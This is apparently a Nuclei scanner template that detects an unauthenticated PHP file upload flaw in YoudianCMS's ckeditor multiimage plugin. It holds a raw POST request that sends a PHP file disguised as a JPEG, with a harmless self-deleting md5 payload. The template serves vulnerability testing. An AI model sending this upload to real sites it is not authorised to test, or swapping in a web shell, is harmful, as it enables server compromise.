id: YoudianCMS-image-upload
info:
  name: YoudianCMS-image-upload
  author: apple
  severity: critical
  description: 前台文件上传。实际上传到/public/image/uploads 目录下.
  reference:
    - https://mp.weixin.qq.com/s/FLugY6nZ59U0gxgPdXwPAQ
  tags: tags
http:
  - raw:
      - |-
        POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 202
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Origin: null
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydAPjrmyKewWuf59H
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.3611
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8
        Connection: close

        ------WebKitFormBoundarydAPjrmyKewWuf59H
        Content-Disposition: form-data; name="files"; filename="xx.php"
        Content-Type: image/jpg

        <?php echo(md5(1)); unlink(__FILE__); ?>');
        ------WebKitFormBoundarydAPjrmyKewWuf59H--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'imgurl'
      - type: word
        part: body
        words:
          - '.php'
